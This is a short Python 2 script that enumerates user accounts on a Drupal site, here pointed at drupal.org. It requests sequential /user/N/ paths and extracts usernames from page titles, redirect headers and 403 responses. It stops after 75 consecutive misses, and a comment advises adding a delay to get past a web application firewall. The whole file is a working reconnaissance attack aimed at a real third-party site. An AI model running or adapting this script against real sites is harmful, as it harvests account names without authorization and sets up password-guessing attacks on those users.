#!/usr/bin/python

#sad version

import httplib
import time

#url
url = "https://www.drupal.org"
#delay is the number of unsuccessful try
delay = 75
#user_id to start
user_id = 1
stop = 0

domain = url.partition('//')[2]
if url.partition(':')[0][-1] == 's':
    ssl = True
else:
    ssl = False

if ssl:
    conn = httplib.HTTPSConnection(domain)
else:
    conn = httplib.HTTPConnection(domain)

#be carreful, drupal must be at /    
conn.request("GET", "/")
response = conn.getresponse()


while(stop != delay):
    if ssl:
        conn = httplib.HTTPSConnection(domain)
    else:
        conn = httplib.HTTPConnection(domain)
    conn.request("GET", "/user/" + str(user_id) + "/")
    response = conn.getresponse()

    if response.status == 200:
        print str(user_id) + ": " + response.read().partition("<title>")[2].partition(" |")[0]
        stop = 0
    elif response.status == 404:
        print str(user_id) + ": //" 
        stop += 1
    elif response.status == 301:
        location = response.getheader('location')
        print location
        if location.rpartition('/')[2] == str(user_id):
            stop += 1
        else: 
            print str(user_id) + " : " + location.rpartition('/')[2]
            stop = 0
    elif response.status == 403:
        potential_username = response.read().partition("/users/")[2].partition('"')[0]
        if potential_username == str(user_id):
            stop += 1
        else:
            print str(user_id) + " : " + potential_username
            stop = 0
    else:
        stop = delay

    user_id +=1
    #if there is a WAF use sleep
    #time.sleep(1)
